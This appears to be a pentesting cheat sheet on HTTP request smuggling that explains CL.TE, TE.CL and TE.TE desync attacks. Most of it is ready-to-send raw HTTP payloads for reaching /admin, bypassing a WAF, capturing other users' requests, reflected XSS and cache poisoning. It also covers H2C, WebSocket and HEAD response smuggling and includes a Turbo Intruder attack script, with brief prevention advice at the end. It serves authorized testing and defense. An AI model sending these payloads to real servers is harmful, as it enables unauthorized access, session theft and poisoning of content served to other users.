---
tags:
  - high
  - infra
---

# HTTP Request Smuggling

Desync front-end/back-end parsing of Content-Length vs Transfer-Encoding headers to inject requests.

## TL;DR

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

If timeout occurs, back-end uses `Transfer-Encoding` (vulnerable to CL.TE).

## How It Works

- Front-end (proxy/CDN) and back-end disagree on request boundaries
- Attacker's "leftover" data becomes prefix of next user's request
- Enables request hijacking, security bypass, cache poisoning

## Vulnerability Types

| Type | Front-End Uses | Back-End Uses |
|------|----------------|---------------|
| CL.TE | Content-Length | Transfer-Encoding |
| TE.CL | Transfer-Encoding | Content-Length |
| TE.TE | TE (normal) | TE (obfuscated) |

## Detection

### Burp Settings
**Disable before testing:**
- Update Content-Length
- Normalize HTTP/1 line endings

### CL.TE Detection

```http
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
0

```

**Vulnerable if:** Back-end times out (expecting more chunks).

### TE.CL Detection

```http
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 6

0

X
```

**Vulnerable if:** Back-end times out (expecting body per CL).

### TE.TE Detection (Obfuscation)

Try until one server ignores TE:
```http
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
[space]Transfer-Encoding: chunked
```

## Exploitation

### CL.TE Smuggling

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 30
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Foo: x
```

- Front-end sends all 30 bytes
- Back-end sees chunked end + smuggled GET
- Next user's request prefixed with `/admin`

### TE.CL Smuggling

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

7b
GET /admin HTTP/1.1
Host: target.com
Content-Length: 30

x=
0

```

### Bypass Front-End Security

```http
POST / HTTP/1.1
Content-Length: 67
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
Content-Length: 10

x=
```

Smuggled request reaches backend directly, bypassing WAF.

### Steal Other Users' Requests

```http
POST / HTTP/1.1
Content-Length: 319
Transfer-Encoding: chunked

0

POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 400

comment=
```

Next user's request becomes `comment` value → visible to attacker.

### Reflected XSS via Smuggling

```http
POST / HTTP/1.1
Transfer-Encoding: chunked
Content-Length: 213

0

GET /page?id=2 HTTP/1.1
User-Agent: "><script>alert(1)</script>
Content-Length: 10

x=
```

Victim receives response with XSS in smuggled User-Agent.

### Cache Poisoning via Smuggling

```http
POST / HTTP/1.1
Content-Length: 130
Transfer-Encoding: chunked

0

GET /static/app.js HTTP/1.1
X-Evil-Header: <script>alert(1)</script>

```

Poisons `/static/app.js` for all users.

## H2C Smuggling

HTTP/2 over cleartext upgrade can bypass proxy security:

```http
GET / HTTP/1.1
Host: target.com
Upgrade: h2c
HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA
Connection: Upgrade, HTTP2-Settings
```

**Impact:** Bypass path restrictions, WAF bypass.

## WebSocket Smuggling

```http
GET /ws HTTP/1.1
Host: target.com
Upgrade: websocket
Sec-WebSocket-Version: 1337  # Invalid

# Proxy thinks WS valid, backend rejects with 426
# TCP connection open for raw requests
```

## Response Smuggling

### HEAD Method Confusion

```http
HEAD /page HTTP/1.1
Host: target.com

GET /evil HTTP/1.1
```

- HEAD response has `Content-Length` but no body
- Next victim's response body interpreted incorrectly

## Tools

| Tool | Purpose |
|------|---------|
| [HTTP Request Smuggler](https://github.com/PortSwigger/http-request-smuggler) | Detection + exploitation |
| [smuggler.py](https://github.com/defparam/smuggler) | Automated detection |
| [h2csmuggler](https://github.com/BishopFox/h2csmuggler) | H2C attacks |

### Turbo Intruder CL.TE

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=1,
                           pipeline=False)
    
    attack = '''POST / HTTP/1.1
Transfer-Encoding: chunked
Content-Length: 35

0

GET /admin HTTP/1.1
X: x'''
    
    engine.queue(attack)
    
    for i in range(14):
        engine.queue('GET / HTTP/1.1\r\nHost: target.com\r\n\r\n')
        time.sleep(0.05)
```

## Prevention

- Use HTTP/2 end-to-end
- Normalize headers before forwarding
- Reject ambiguous requests (both CL and TE)
- Drop requests with TE obfuscation
